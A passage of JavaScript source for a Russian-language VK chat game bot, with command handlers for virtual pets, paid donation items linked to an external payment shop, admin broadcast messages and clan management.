if(user.pettimer > 0) return context.send(`${nick}, вы сможете отправить питомца в поход через ${user.pettimer} минут. Ваш питомец довольно сильно устал! 😔`)
if(user.rank < 2 && user.pettid !== 8) {
	user.petlostchance += getRandomInRange(1, 5)
	let lost = getRandomInRange(user.petlostchance, 100)
	if(lost < Number(user.petlostchance)) {
		user.petid = 0
		user.petname = ``
		user.petlvl = 0
		return context.send(`${nick}, ваш питомец потерялся в лесу 😮`)
		}
	}
let pet = user.petid
let finder = 0 
for(let o in pets){
if(pets[o].id == pet){
finder = pets[o].find
}
}
finder *= user.petlvl
let money = getRandomInRange(100, finder)
user.balance += Number(money)
if(user.petid !== 8 && user.rank < 2) user.pettimer = 60
if(user.petid == 8) user.pettimer = 15
if(user.rank > 1 && user.petid !== 8) user.pettimer = 30
return context.send(`${nick}, ваш питомец нашёл в походе ${utils.sp(money)}$. Он может пропасть в походе, улучшайте своего питомца!`)
})

updates.hear(/питомец улучшить$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.petid < 1) return context.send(`${nick}, у Вас нет питомца, отправьте «питомцы» чтобы получить список всех питомцев.`)
if(user.petlvl > 99) return context.send(`${nick}, ваш питомец достиг максимального уровня 🤑`)
let lvlup = 0
let pet = user.petid
for(let o in pets){
if(pets[o].id == pet){
lvlup = pets[o].up
}
}
if(user.balance < lvlup) return context.send(`${nick}, у Вас недостаточно денег 😮`)
user.balance -= Number(lvlup)
user.petlvl += Number(1)
return context.send(`${nick}, питомец был прокачен до ${user.petlvl} уровня за ${utils.sp(lvlup)}$
💰 Ваш баланс: ${utils.sp(user.balance)}$`)
})
updates.hear(/питомец (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(!Number(context.$match[1])) return context.send(`${nick}, Неверный номер 😒`)
let pet = Number(context.$match[1])
if(pet > 9) return context.send(`${nick}, Неверный номер 😒`)
if(pet < 1) return context.send(`${nick}, Неверный номер 😒`)
if(user.petid > 0) return context.send(`${nick}, у вас уже есть питомец - ${user.peticon} ${user.petname} 😟
❓ Для продажи введите «Продать питомца>>`)

for(let o in pets){
if(pets[o].id == pet){
if(user.balance < Number(pets[o].cost)){
return context.send(`${nick}, у вас недостаточно денег 😔`)
}
user.balance -= Number(pets[o].cost)
user.petid = Number(pet)
user.petname = `${pets[o].name}`
user.petlvl = 1
user.petlostchance = 0
user.peticon = `${pets[o].icon}`
return context.send(`${nick}, вы успешно купили себе питомца «${pets[o].icon} ${pets[o].name}», отправляйте его в поход и прокачивайте его уровень.`)
}
}

})


updates.hear(/питомец$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.petid < 1) return context.send(`${nick}, у Вас нет питомца, отправьте «питомцы» чтобы получить список всех питомцев.`)
	
	
	let pet = user.petid
	let lvlup = 0
	let finder = 0
	for(let o in pets){
	if(pets[o].id == pet){
	lvlup = pets[o].up
	finder = pets[o].find
	}
	}
	finder *= user.petlvl
	return context.send(`${nick}, информация:
${user.peticon} Питомец: «${user.petname}»
🤑 Приносит до: ${utils.sp(finder)}$
💳 Стоимость улучшения: ${utils.sp(lvlup)}$
🌟 Уровень: ${user.petlvl}`)
})




updates.hear(/донат 2$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.express + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}) 

updates.hear(/донат 1$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.studio + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    //console.log(x)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}) 

updates.hear(/донат 3$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.jorik + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    //console.log(x)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}) 

updates.hear(/донат 4$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.premium + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    //console.log(x)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}) 

updates.hear(/донат 5$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    const ssi = await request("https://api.mcpetrade.com/shop.createPayment?shop="+ mcpetrade.shop + "&server=" + mcpetrade.server+ "&product=" + mcpetrade.vip + "&username="+base.id[context.senderId].id+"&coupon=");
    var x = JSON.parse(ssi)
    //console.log(x)
    let ssil = await vk.api.utils.getShortLink({url: `${x.response}`})
    return context.send(`${nick}, Для оплаты товара перейдите по данной ссылке: ${ssil.short_url} 🛍️`)
}) 

updates.hear(/донат$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, Доступный донат:
1.🎥 Бизнес «Киностудия», один из самых лучших бизнесов, с прибылью в 25,000,000,000$
🔹Продать бизнес можно за 25,000,000,000,000$.
🔸Цена: 24(без скидки 49)₽. Для покупки введите: «донат 1» 🎁

2.💼 Бизнес «Межпланетный Экспресс», самый лучший бизнес, с прибылью в 300,000,000,000$
🔹Продать бизнес можно за 125,000,000,000,000$.
🔸Цена: 144(без скидки 289)₽. Для покупки введите: «донат 2» 🎁

3.🐑 Питомец «Жорик», самый лучший питомец.
🔹При максимальном уровне приносит до 500,000,000,000,000$
🔹Жорика невозможно потерять в походе
🔹Жорик устаёт всего на 15 минут вместо 60-ти.
🔸Продать Жорика можно за 40,000,000,000,000$
🔸Цена: 47(без скидки 95)₽. Для покупки введите: «донат 3» 🐰

4.🔮 Статус «Premium», самый лучший донат статус.
🔹Подробное описание здесь: «${premdesc}»
🔸Цена: 225(без скидки 450)₽. Для покупки введите: «донат 4» 🛍️

5.🔥 Статус «V.i.P», самый дешёвый донат статус.
🔹Подробное описание здесь: «${vipdesc}»
🔸Цена: 47(без скидки 95)₽. Для покупки введите: «донат 5» 🛍️



`)
})

updates.hear(/delete$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let uid = base.id[context.senderId].id
	delete base.bs[uid]
	delete base.id[context.senderId]
	return context.send(`Test >> Ты удалён с базы`)

})

updates.hear(/@sendtext (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 10) return
let text = context.$match[1]
for(let o in base.bs){
if(base.bs[o].notifications == true) {
	vk.api.messages.send({user_id: base.bs[o].id, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let b in chats.ids){
	if(chats.ids[b].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[b].id, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n`, 
  })
	}
}
})

updates.hear(/@sendwall (.*) https:(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 10) return
let text = context.$match[1]
let wall = `wall${context.$match[2]}`
wall = wall.replace(`https://vk.com/bot_jopa?w=`,``)
wall = wall.replace(`//vk.com/bot_jopa?w=wall`,``)
//console.log(wall)
for(let o in base.bs){
if(base.bs[o].notifications == true) {
	vk.api.messages.send({user_id: base.bs[o].id, attachment: wall, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let b in chats.ids){
	if(chats.ids[b].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[b].id, attachment: wall, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n`, 
  })
	}
}
})

updates.hear(/@sendshoot (.*) https:(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 10) return
let text = context.$match[1]
let wall = `wall${context.$match[2]}`
wall = wall.replace(`https://vk.com/bot_jopa?w=`,``)
wall = wall.replace(`//vk.com/bot_jopa?w=wall`,``)
//console.log(wall)
for(let o in base.bs){
if(base.bs[o].notifications == true) {
	vk.api.messages.send({user_id: base.bs[o].id, attachment: wall, message: `${context.$match[1]}`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let b in chats.ids){
	if(chats.ids[b].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[b].id, attachment: wall, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n`, 
  })
	}
}
})

updates.hear(/@sendwall (.*) wall(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 10) return
let text = context.$match[1]
let wall = `wall${context.$match[2]}`
wall = wall.replace(`https://vk.com/bot_jopa?w=`,``)
//console.log(wall)
for(let o in base.bs){
if(base.bs[o].notifications == true) {
	vk.api.messages.send({user_id: base.bs[o].id, attachment: wall, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n🔕 Введите «Уведомления выкл», если не хотите получать подобные сообщения`, keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: Keyboard.NEGATIVE_COLOR,
            }),
      ]
     ])
     .inline(true)
  })
}
}
for(let b in chats.ids){
	if(chats.ids[b].active !== 3) {
		vk.api.messages.send({chat_id: chats.ids[b].id, attachment: wall, message: `[УВЕДОМЛЕНИЕ]\n▶ ${context.$match[1]}\n`, 
  })
	}
}
})


updates.hear(/premium$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 3) return 
return context.send(`${nick}, Доступные команды:
им ${base.id[context.senderId].id} "имущество" "название" - сменить название имуществу.

>> Все остальные команды в разработке...`)
})


updates.hear(/vip$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.rank < 2) return
		return context.send(`${nick}, Команды V.i.P игрока в разработке...`)
})

updates.hear(/(клан удалить)\s(.*)/i, async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	myclan.delete = 0
	let idm = `${context.$match[2]}`
	let ids = `${myclan.id}`
	if(myclan.players[base.id[context.senderId].id].rank < 3) return context.send(`${nick}, вы не создатель клана. 🙈`)
	if(idm !== ids) return context.send(`${nick}, вы точно хотите удалить клан «${myclan.name}»? Если да, отправьте для подтверждения: "клан удалить ${base.bs[base.id[context.senderId].id].clan}"`)
	let ass = []
	for(let i in myclan.players){
		ass.push({
			id: myclan.players[i].id
		})
	}
	delete clan[user.clan]
	for(let i = 0;i < ass.length;i++){
		base.bs[base.id[ass[i].id].id].clan = 0
	}
	return context.send(`${nick}, вы успешно удалили клан. 💯`)
})

updates.hear(/(клан исключить)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(myclan.players[base.id[context.senderId].id].rank < 2) return context.send(`${nick}, вы не создатель/администратор клана. 🙈`)
	if(!myclan.players[context.$match[2]]) return context.send(`${nick}, данного игрока нет в клане.🙈`)
	if(context.$match[2] == base.id[context.senderId].id) return context.send(`${nick}, вы не можете кикнуть данного игрока.`)
	if(myclan.players[context.$match[2]].rank > 1) return context.send(`${nick}, вы не можете кикнуть данного игрока.`)
	base.bs[base.id[myclan.players[context.$match[2]].id].id].clan = 0
	delete myclan.players[context.$match[2]]
	myclan.player -= 1
	return context.send(`${nick}, вы успешно кикнули игрока.`)	
})

updates.hear(/(клан исключить)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, использование: «клан исключить [ID игрока]»`)
})

updates.hear(/(клан пригласить)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(myclan.players[base.id[context.senderId].id].rank < 2) return context.send(`${nick}, вы не администратор/модератор клана. 🙈`)
	if(!base.bs[context.$match[2]]) return context.send(`${nick}, вы указали некорректный ID.`)
	if(base.bs[context.$match[2]].clan !== 0) return context.send(`${nick}, данный игрок уже состоит в клане.`)
	if(base.bs[context.$match[2]].clanplayer === 50) return context.send(`${nick}, в клане макс. количество игроков.`)
	if(myclan.add[context.$match[2]]) return context.send(`${nick}, данный игрок уже приглашен`)
	vk.api.messages.send({
		user_id: base.bs[context.$match[2]].id, message: `*id${base.bs[context.$match[2]].id} (${base.bs[context.$match[2]].nick}), вы приглашены в клан «${myclan.name}», чтобы вступить отправьте «клан вступить ${myclan.id}». ⚔`
	})
	myclan.add[context.$match[2]] = {
		time: 200,
		id: context.$match[2]
	}
	return context.send(`${nick}, приглашение создано! *id${base.bs[context.$match[2]].id} (${base.bs[context.$match[2]].nick}) должен отправить «клан вступить ${myclan.id}». ⚔`)
})

updates.hear(/(клан пригласить)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, использование: «клан пригласить [ID игрока]»`)
})

updates.hear(/(клан вступить)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan !== 0) return context.send(`${nick}, вы уже состоите в клане. 🤐`);
	if(!clan[context.$match[2]]) return context.send(`${nick}, вы указали некоррекнтый ID клана. 🤐`);
	if(!clan[context.$match[2]].add[base.id[user.id].id]) return context.send(`${nick}, вам не поступало приглашения в этот клан.`)
	if(clan[context.$match[2]].player === 50) return context.send(`${nick}, в данном клане максимальное количество игроков.`)
	user.clan = Number(context.$match[2])
	delete clan[context.$match[2]].add[base.id[context.senderId].id]
	clan[context.$match[2]].player += 1
	clan[context.$match[2]].players[base.id[context.senderId].id] = {
		id: context.senderId,
		rank: 1 ,
		money: 0,
		timemoney: {}
	}
	return context.send(`${nick}, вы вошли в клан «${clan[context.$match[2]].name}»! 👑`)
})

updates.hear(/(клан вступить)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, использование: «клан вступить [ID клана]»`)
})

updates.hear(/клан состав$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	let sp = []
	let players = ``
	for(let i in myclan.players){
		sp.push({
			id: myclan.players[i].id
		})
	}
	for(let i = 0; i < sp.length; i++){
		let rankb = `${myclan.players[base.id[sp[i].id].id].rank}`

		if(rankb == "1") rankb = `🔹`
		if(rankb == "2") rankb = `👑`
		if(rankb == "3") rankb = `👑`
		players += `\n${rankb}[ID ${base.id[sp[i].id].id}] *id${sp[i].id} (${base.bs[base.id[sp[i].id].id].nick})`
	}
	return context.send(`
			${nick}, состав клана «${myclan.name}»:${players}
		`)
})

updates.hear(/(клан удалить)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	myclan.delete = 0
	if(myclan.players[base.id[context.senderId].id].rank < 3) return context.send(`${nick}, вы не владелец клана. 🙈`)
	if(myclan.delete === 0) {
		myclan.delete = 1
		return context.send(`${nick}, вы точно хотите удалить клан «${myclan.name}»? Если да, отправьте для подтверждения: "клан удалить ${myclan.id}"`)
	}
	return cotnext.send(`${nick}, отправьте для подтверждения: "клан удалить ${myclan.id}`)
})

updates.hear(/(клан выйти)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(myclan.players[base.id[context.senderId].id].rank > 2) return context.send(`${nick}, вы создатель клана. 🙈`)
	myclan.player -= 1
	user.clan = 0
	let name = `${myclan.name}`
	delete myclan.players[base.id[context.senderId].id]
	return context.send(`${nick}, вы успешно вышли из клана «${name}» 🚶‍♂`)
})

updates.hear(/(клан админ)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(!myclan.players[context.$match[2]]) return context.send(`${nick}, данного игрока нет в клане.🙈`)
	if(myclan.players[base.id[context.senderId].id].rank !== 3) return context.send(`${nick}, вы не создатель клана.`)
	if(myclan.players[context.$match[2]].rank === 2 || myclan.players[context.$match[2]].rank === 3) return context.send(`${nick}, вы не можете повысить данного игрока.`)
	myclan.players[context.$match[2]].rank = 2
	return context.send(`${nick}, игрок *id${base.bs[context.$match[2]].id} (${base.bs[context.$match[2]].nick}) повышен до администратора.`)
})

updates.hear(/(клан снять)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(base.bs[base.id[context.senderId].id].clan === 0) return context.send(`${nick}, вы не состоите в клане. 🤐`)
	if(!myclan.players[context.$match[2]]) return context.send(`${nick}, данного игрока нет в клане.🙈`)
	if(myclan.players[base.id[context.senderId].id].rank !== 3) return context.send(`${nick}, вы не создатель клана.`)
	if(myclan.players[context.$match[2]].rank === 1 || myclan.players[context.$match[2]].rank === 3) return context.send(`${nick}, вы не можете снять данного игрока.`)
	myclan.players[context.$match[2]].rank = 1
	return context.send(`${nick}, игрок *id${base.bs[context.$match[2]].id} (${base.bs[context.$match[2]].nick}) понижен до игрока.`)
})

updates.hear(/(клан создать)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.clan > 0){
		return context.send(`
			${nick}, вы уже состоите в клане, покиньте его чтобы создать новый. 🏃‍♂
		`)
	}
	if(user.balance < 100000000000) return context.send(`${nick}, вам нужно 100.000.000.000$ для создания клана.`)
	base.context.clanid += 1
	clan[base.context.clanid] = {
			owner: base.id[context.senderId].id,
			name: `${context.$match[2]}`,
			id: base.context.clanid,
			rating: 0,
			money: 0,
			player: 1,
			moneytime: {},
			players: {},
			add: {},
			win: 0,
			louse: 0,
			attackyou: 0,
			guard: 0,
			shielddate: ``,
			knight: 0,
			attacktimer: 0,
			attackdate: ``,
			bowman: 0
	}
	clan[base.context.clanid].players[base.id[context.senderId].id] = {
		id: user.id,
		rank: 3,
		money: 0,
		timemoney: {}
	}
	base.bs[base.id[context.senderId].id].clan = Number(base.context.clanid)
	user.balance -= 100000000000
	return context.send(`${nick}, вы успешно создали клан под названием «${clan[user.clan].name}», ему присвоен ID ${user.clan}. 👋🏻`)
})

updates.hear(/(клан создать)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, использование: «клан создать [название]»`)
})

updates.hear(/(клан казна)\s(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
